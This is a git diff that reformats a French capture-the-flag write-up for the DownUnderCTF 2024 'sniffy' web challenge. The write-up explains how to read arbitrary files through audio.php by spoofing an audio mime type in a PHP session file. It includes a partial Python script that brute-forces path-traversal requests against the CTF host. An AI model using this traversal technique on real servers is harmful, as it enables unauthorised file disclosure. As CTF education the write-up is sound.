@@ -10,7 +10,7 @@ ogImage:
   url: "/assets/blog/hello-world/cover.jpg"
 ---
 
-code : [https://github.com/DownUnderCTF/Challenges_2024_Public/tree/main/web/sniffy/src](https://github.com/DownUnderCTF/Challenges_2024_Public/tree/main/web/sniffy/src)
+[Source du challenge](https://github.com/DownUnderCTF/Challenges_2024_Public/tree/main/web/sniffy/src)
 
 Après une rapide review de code, on remarque que notre input est passé à la fonction readfile dans audio.php. On aurait potentiellement la possibilité de lire des fichiers arbitraires, cependant certains check sont fait avant pour ne pas lire n'importe quoi. En particulier, il faut que le fichier est un mime type qui commence par "audio". 
 
@@ -25,7 +25,8 @@ Qui est très intéressante puisqu'il suffit d'écrire un "CD81" au bon endroit 
 
 Sur le serveur, ne connaissant pas le taille du flag, il nous faire un léger bruteforce.
 
-```import requests
+```python
+import requests
 
 # we need to put CD81 at index 1080
 padding = 1080-30 # 30 is len of extra data
@@ -37,4 +38,5 @@ for len_flag in range(40,60):
     r = requests.get(f"https://web-sniffy-d9920bbcf9df.2024.ductf.dev/audio.php?f=../../../../tmp/sess_{sessid}")
     print(r.status_code, r.text)
     if r.status_code != 403:
-        break```
+        break
+```
